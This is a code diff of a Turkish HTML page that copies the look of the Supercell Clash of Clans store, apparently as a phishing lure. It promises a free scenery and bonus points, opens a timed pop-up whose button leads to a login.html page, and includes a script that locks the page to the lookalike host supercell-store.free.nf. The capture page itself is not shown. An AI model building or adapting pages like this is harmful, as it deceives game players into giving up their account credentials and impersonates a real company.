@@ -1,162 +1,166 @@
-<!DOCTYPE html>
 <html lang="tr">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Özel Etkinlik</title>
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <script>
+  (function() {
+    var allowedHost = "supercell-store.free.nf"; 
+    var currentHost = window.location.hostname.replace(/^www\./i, "");
+    if (currentHost !== allowedHost) {
+      document.documentElement.innerHTML = `
+        <div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#111;color:#fff;text-align:center;padding:20px;">
+          <div>
+            <h1 style="font-size:20px;margin-bottom:12px">&#9888; İZİNSİZ KOPYA SPHENX/ TESPİT EDİLDİ</h1>
+            <p>Orijinal siteyi ziyaret et: 
+              <a href="https://${allowedHost}" style="color:#9be6ff">${allowedHost}</a>
+            </p>
+          </div>
+        </div>
+      `;
+    }
+  })();
+</script>
 
-<style>
-*{margin:0;padding:0;box-sizing:border-box}
-
-body{
-  background:#6b3f1f;
-  display:flex;
-  justify-content:center;
-  padding:20px 0;
-  font-family:Arial, sans-serif;
-}
-
-/* ANA KART */
-.card{
-  width:420px;
-  max-width:95%;
-  background:url("https://i.hizliresim.com/cn32nyo.jpg") center/cover no-repeat;
-  border-radius:16px;
-  overflow:hidden;
-  animation:cardIn .6s ease-out forwards;
-}
-
-@keyframes cardIn{
-  from{opacity:0; transform:scale(.95)}
-  to{opacity:1; transform:scale(1)}
-}
-
-/* BAŞLIK */
-.header{
-  text-align:center;
-  font-size:30px;
-  font-weight:900;
-  padding:18px 10px;
-  opacity:0;
-  animation:fadeUp .6s ease-out forwards;
-  animation-delay:.2s;
-}
-
-@keyframes fadeUp{
-  to{opacity:1; transform:translateY(0)}
-}
-
-/* ÜST ETKİNLİK GÖRSELİ */
-.event img{
-  width:100%;
-  display:block;
-  opacity:0;
-  transform:translateY(20px);
-  animation:fadeUp .6s ease-out forwards;
-  animation-delay:.4s;
-}
-
-/* ITEM ALANI */
-.items{
-  position:relative;
-  padding:24px 0 10px;
-}
-
-/* FLARE */
-.items::before{
-  content:"";
-  position:absolute;
-  inset:0;
-  background:url("https://store.supercell.com/_next/static/media/shop_item_bg_flare.79c48672.png")
-             center/cover no-repeat;
-  opacity:.55;
-}
-
-/* ORTA BÜYÜK GÖRSEL */
-.scenery{
-  position:relative;
-  text-align:center;
-  opacity:0;
-  transform:scale(.9);
-  animation:itemIn .6s ease-out forwards;
-  animation-delay:.6s;
-}
-
-.scenery img{
-  width:100%;
-  max-width:360px;
-  border-radius:12px;
-}
-
-/* KÜÇÜK İKON */
-.icon{
-  position:relative;
-  text-align:center;
-  margin-top:-28px;
-  opacity:0;
-  animation:itemIn .5s ease-out forwards;
-  animation-delay:.8s;
-}
-
-.icon img{
-  width:72px;
-}
-
-/* ITEM / PASS */
-.item{
-  position:relative;
-  text-align:center;
-  margin:18px 0;
-  opacity:0;
-  transform:translateY(30px) scale(.9);
-  animation:itemIn .5s ease-out forwards;
-}
-
-.item.pass{animation-delay:1s}
-
-@keyframes itemIn{
-  to{
-    opacity:1;
-    transform:translateY(0) scale(1);
-  }
-}
-
-.item img{
-  width:140px;
-}
-</style>
-</head>
-
-<body>
-
-<div class="card">
-
-  <div class="header">TEK SEFERLİK FIRSAT!</div>
-
-  <div class="event">
-    <img src="https://i.hizliresim.com/anfq9t8.png">
+  <title>Mağaza Sayfası</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&amp;display=swap" rel="stylesheet"/>
+  <style>
+   body { font-family: 'Roboto', sans-serif; }
+   .font-supercell { font-family: 'Supercell-Magic', sans-serif; }
+  </style>
+ </head>
+ <body class="bg-blue-50 font-roboto relative">
+  <div class="max-w-screen-sm mx-auto">
+   <img alt="Kalkan ve oklarla süslenmiş üst arka plan" class="w-full h-auto" src="https://i.hizliresim.com/i14hpx9.jpg"/>
   </div>
 
-  <div class="items">
+  <!-- Başlık -->
+  <div class="text-center mt-4 max-w-screen-sm mx-auto px-4">
+   <h1 class="text-4xl font-bold flex items-center justify-center font-supercell select-none">
+    <img alt="Clash of Clans ikonu" class="w-8 h-8 mr-2" src="https://store.supercell.com/_next/static/media/coc_icon_scenery.a300b94a.png" width="30" height="30"/>
+    <span>Arka Planlar</span>
+   </h1>
+  </div>
 
-    <!-- BÜYÜK SCENERY -->
-    <div class="scenery">
-      <img src="https://event-assets.clashofclans.com/e791e432-7490-488f-bc45-1ed332f84519_Scenery_Clash_Games.png">
+  <!-- Grid: Karanlık Günler + Ejderhalar Savaşı -->
+  <div class="grid grid-cols-1 md:grid-cols-2 gap-6 justify-center mt-6 max-w-screen-sm mx-auto px-4">
+
+    <!-- Karanlık Günler -->
+    <div class="bg-white rounded-lg shadow-lg p-4">
+      <div class="bg-blue-200 rounded-t-lg p-4">
+       <h2 class="text-2xl font-bold text-center">Ejderhalar Savaşı Arka Planı</h2>
+       <div class="mt-4 rounded-lg overflow-hidden">
+         <video muted playsinline loop autoplay 
+            poster="https://game-assets.store.supercell.com/clashofclans/de84605b-e080-420c-bf3d-def796be7355.png" 
+            preload="metadata" 
+            class="w-full h-auto rounded-lg">
+            <source src="https://game-assets.store.supercell.com/clashofclans/b193fdcf-9f59-4f69-a20b-f458c5299a8c.mov#t=0.1" type="video/quicktime;codecs=hvc1">
+            <source src="https://game-assets.store.supercell.com/clashofclans/86015b42-68cf-4f8b-ab3b-c97d1084420f.webm#t=0.1" type="video/webm">
+            <img alt="Video bulunamadı" src="https://store.supercell.com/_next/static/media/store_not_found_bag.ac1f8504.svg" width="130" height="119">
+         </video>
+       </div>
+      </div>
+      <div class="flex justify-between items-center mt-4">
+       <div class="flex items-center space-x-2">
+        <div class="bg-black text-white rounded-full px-2 py-1 text-sm flex items-center">
+         <img alt="Bonus puan" class="w-4 h-4 mr-1" src="https://store.supercell.com/_next/static/media/bonus-track-points-icon.b1806b98.svg"/>
+         +350 puan
+        </div>
+        <div class="bg-white text-black border border-black rounded-full px-2 py-1 text-sm flex items-center">
+         <img alt="IDR bilgi" class="w-4 h-4 mr-1" src="https://store.supercell.com/_next/static/media/idr-info-icon.6b1624a6.png"/>
+         +350 puan
+        </div>
+       </div>
+       <a id="buyButton" class="bg-black text-white rounded-full px-4 py-2 text-sm flex items-center select-none cursor-pointer" href="login.html">
+        <i class="fas fa-shopping-bag mr-1"></i> Ücretsiz
+       </a>
+      </div>
     </div>
 
-    <!-- SCENERY ICON -->
-    <div class="icon">
-      <img src="https://event-assets.clashofclans.com/4f82675a-95cd-41e6-a6f0-45186ef1d914_scenery_icon_clashoween2024_1000x1000px.png">
-    </div>
+    <!-- Ejderhalar Savaşı -->
+    <div class="bg-white rounded-lg shadow-lg p-4">
+      <button class="relative bg-[#3b2d23] hover:bg-[#2a1f17] text-white w-full rounded-lg overflow-hidden transition transform hover:scale-105 duration-300">
+        
+        <!-- Başlık -->
+        <h3 class="text-xl font-bold text-center pt-4">Ejderhalar Savaşı</h3>
 
-    <!-- GOLD PASS -->
-    <div class="item pass">
-      <img src="https://event-assets.clashofclans.com/321c5d86-bc29-4f00-a9dd-32520ce3c3a9_9b5acf93_9989_4337_92ea_c5acff56e1fa_gold_pass.png">
+        <!-- Flare -->
+        <div class="absolute inset-0">
+          <div class="w-full h-full bg-no-repeat bg-center opacity-40" 
+               style="background-image:url('https://store.supercell.com/_next/static/media/shop_item_bg_flare.79c48672.png')">
+          </div>
+        </div>
+
+        <!-- Resim -->
+        <div class="relative flex items-center justify-center py-6">
+          <img alt="Ejderhalar Savaşı" 
+               src="https://game-assets.store.supercell.com/clashofclans/de84605b-e080-420c-bf3d-def796be7355.png" 
+               class="w-40 h-40 object-contain relative z-10" />
+        </div>
+
+        <!-- Footer -->
+        <div class="bg-black bg-opacity-40 py-2 text-center relative z-10">
+          <h4 class="text-lg font-bold">1x</h4>
+        </div>
+      </button>
     </div>
 
   </div>
 
-</div>
+  <!-- Bonus ve görsel -->
+  <div class="flex justify-center mt-4 max-w-screen-sm mx-auto px-4">
+   <div class="bg-white rounded-lg shadow-lg p-4 w-80 flex flex-col items-center justify-between">
+    <div class="flex items-center space-x-2 mb-2">
+     <div class="bg-yellow-400 text-black rounded-full px-2 py-1 text-sm flex items-center select-none font-bold">
+      <i class="fas fa-coins mr-1"></i> 3500 PUAN
+     </div>
+     <span class="text-sm select-none flex items-center space-x-1">
+      <span>Sonraki Mağaza Bonusu</span>
+      <img alt="Sonraki mağaza bonusu" class="w-6 h-6" src="https://event-assets.clashofclans.com/ea59d115-ade8-4a42-b279-d5cc0d0817be_ring_of_walls.png"/>
+     </span>
+    </div>
+    <img alt="Resim Yükle" src="https://i.hizliresim.com/7gte5m3.jpg" class="w-full rounded"/>
+   </div>
+  </div>
 
-</body>
+  <!-- Modal -->
+  <div id="modal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
+   <div class="bg-white rounded-lg shadow-lg max-w-xs w-full p-6 text-center">
+    <h3 class="text-xl font-bold mb-4">Etkinlik!</h3>
+    <video muted playsinline loop autoplay 
+      poster="https://game-assets.store.supercell.com/clashofclans/de84605b-e080-420c-bf3d-def796be7355.png" 
+      class="mx-auto mb-4 rounded w-40 h-auto">
+      <source src="https://game-assets.store.supercell.com/clashofclans/86015b42-68cf-4f8b-ab3b-c97d1084420f.webm#t=0.1" type="video/webm">
+      <img alt="Video bulunamadı" src="https://store.supercell.com/_next/static/media/store_not_found_bag.ac1f8504.svg">
+    </video>
+    <p class="mb-6">Ejderhalar Savaşı Arka Planı ücretsiz olarak alınabilir.</p>
+    <button id="acceptBtn" class="bg-blue-600 hover:bg-blue-700 text-white font-semibold px-4 py-2 rounded mr-2">
+     Ücretsiz Al
+    </button>
+    <button id="closeBtn" class="bg-gray-300 hover:bg-gray-400 text-gray-800 font-semibold px-4 py-2 rounded">
+     Kapat
+    </button>
+   </div>
+  </div>
+
+  <!-- JS -->
+  <script>
+   window.addEventListener('load', () => {
+    const modal = document.getElementById('modal');
+    const acceptBtn = document.getElementById('acceptBtn');
+    const closeBtn = document.getElementById('closeBtn');
+    const buyButton = document.getElementById('buyButton');
+
+    setTimeout(() => { modal.classList.remove('hidden'); }, 2000);
+
+    acceptBtn.addEventListener('click', () => {
+      modal.classList.add('hidden');
+      if (buyButton) buyButton.click();
+    });
+
+    closeBtn.addEventListener('click', () => { modal.classList.add('hidden'); });
+   });
+  </script>
+ </body>
 </html>
